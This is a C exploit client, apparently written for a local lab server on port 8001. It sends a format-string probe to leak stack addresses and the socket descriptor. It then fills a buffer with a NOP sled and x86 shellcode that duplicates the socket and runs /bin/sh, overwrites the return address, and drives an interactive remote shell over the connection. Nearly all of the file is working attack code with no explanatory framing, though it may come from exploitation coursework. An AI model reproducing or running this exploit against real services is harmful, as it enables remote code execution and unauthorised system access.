
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>
#include <fcntl.h>

#define	PORTNUM	8001
#define	BLENGTH	256

/* Extract informations from the string sent from read_command in the server composed of informations about the stack */
char *
stringToAddress(char *asciiAddr) {
	printf("asciiAddr : %s\n", asciiAddr);
	unsigned int integerAddr;
	char *addr = malloc(4); 

	/* strtoul because the addresse if greater than LONG_MAX */
	integerAddr = (unsigned int)strtoul(asciiAddr, NULL, 16);

	/* integerAddr is the address of response, getting address of answer */
	integerAddr += 256;
	printf("%lx\n", integerAddr); 
	addr = memcpy(addr, (char *)(&integerAddr), 4);

	return addr;
}

char **
strToWordtab(char *string, char *delimiter) {
	char **wordtab;
	char *token;
	size_t size = 0;
	unsigned int i = 0;

	wordtab = malloc(256);

	while ((token = strsep(&string, delimiter)) != NULL)
	{
		wordtab[i++] = token;
	}
	wordtab[i] = NULL;

	return wordtab;	
}


static void
exploit(int s)
{
	char **runtimeArray;
  	char buffer[BLENGTH];
	char *answerAddress;
	int socket;

	/*char shellcode[] =
	"\xeb\x13\x5e\x31\xc0\x31\xdb\x31"
	"\xc9\x31\xd2\xb3\x01\x89\xf1\xb2"
	"\x07\xb0\x04\xcd\x80\xe8\xe8\xff"
	"\xff\xff\x2f\x62\x69\x6e\x2f\x73"
	"\x68";*/

	char shellcode[] = 
	"\xeb\x36\x31\xc0\x31\xdb\x88\xc3"
	"\xb0\x06\xcd\x80\xb3\x01\xb0\x06"
	"\xcd\x80\xb3\x02\xb0\x06\xcd\x80"
	"\xb3\x03\xb0\x29\xcd\x80\xb0\x29"
	"\xcd\x80\xb0\x29\xcd\x80\x5e\x31"
	"\xc0\x88\x46\x07\x50\x56\x31\xd2"
	"\x89\xe1\x89\xf3\xb0\x0b\xcd\x80"
	"\xe8\xc5\xff\xff\xff\x2f\x62\x69"
	"\x6e\x2f\x73\x68";


	/*char shellcode[] = 
	"\xeb\x22\x31\xc0\x31\xdb\x88\xc3"
	"\xb0\x06\xcd\x80\xb3\x03\xb0\x29"
	"\xcd\x80\x5e\x31\xc0\x88\x46\x07"
	"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
	"\xb0\x0b\xcd\x80\xe8\xd9\xff\xff"
	"\xff\x2f\x62\x69\x6e\x2f\x73\x68"; working for duping stdin */



	/* Exploit snprintf vulnerability and get answer address */
  	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);

	memset(buffer, '\0', BLENGTH);
	send(s, "%d %p %p %p %p %p %d %p %p\n", BLENGTH, 0);
  	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);
	
	/* 6 = socket ; 8 = answer address,  */
	runtimeArray = strToWordtab(buffer, " ");	
	socket = strtol(runtimeArray[6], NULL, 10);
	answerAddress = runtimeArray[8];
	
	printf("socket : %d\n; %d\n", socket, s);

	/* remove ; from answer address */

	answerAddress[strlen(answerAddress) - 1] = '\0';

	char *payloadAddress = stringToAddress(answerAddress);
	
	send(s, "1\n", 2, 0);
  	recv(s, (void *)buffer, BLENGTH, 0);
	fputs(buffer, stdout);

	/* clear anwser with NOP instruction */
	memset(buffer, '\x90', 128);

//	printf("buffer[i] : %d\n", buffer[0]);

	/* anwer[128] + x(4) + EBP(4) */

	strncpy(buffer, shellcode, strlen(shellcode));
	buffer[136] = payloadAddress[0];
	buffer[137] = payloadAddress[1];
	buffer[138] = payloadAddress[2];
	buffer[139] = payloadAddress[3];
	buffer[140] = '\0';

	/* TODO: Replace the occurence to the socket by the actual file descriptor of the socket */

	//printf("buffer[13] : %d", buffer[25]);
	buffer[25] = socket;

	send(s, (void *)buffer, BLENGTH, 0);

	/* Set socket to nonblocking mode */
	int flags = fcntl(s, F_GETFL, 0);
	fcntl(s, F_SETFL, flags | O_NONBLOCK);

	size_t ret = 0;

	/*for (;;) {
		memset(buffer, '\0', BLENGTH);
		fgets(buffer, BLENGTH, stdin);
		send(s, buffer, BLENGTH, 0);
		
		sleep(1);
		//do {
			ret = recv(s, buffer, BLENGTH, 0);
			fputs(buffer, stdout);			
		//}
		//while (ret != 0);		
	}	*/

	fd_set rfds;
	fd_set wfds;
 	int retval;

	for (;;) {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(s, &rfds);
		retval = select(s+1, &rfds, &wfds, NULL, NULL);
		if (retval == -1) {
			perror("select()");
			exit(1);
		}
		else {
			if (FD_ISSET(0, &rfds)) {
				fputs("\x1B[2J\x1B[H", stdout);
				memset(buffer, '\0', BLENGTH);
				fgets(buffer, BLENGTH, stdin);
				write(1, "###:>", 5);
				fputs(buffer, stdout);
				write(1, "\n", 1);
				send(s, buffer, BLENGTH, 0);
			}
			else if (FD_ISSET(s, &rfds)) {
				ret = recv(s, buffer, BLENGTH, 0);
				if (ret == 0)
					exit(1);
				buffer[ret] = '\0';
				fputs(buffer, stdout);
			}
		}
	}
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  exploit(s);

  /* Close the socket */
  close(s);

  return (0);
}
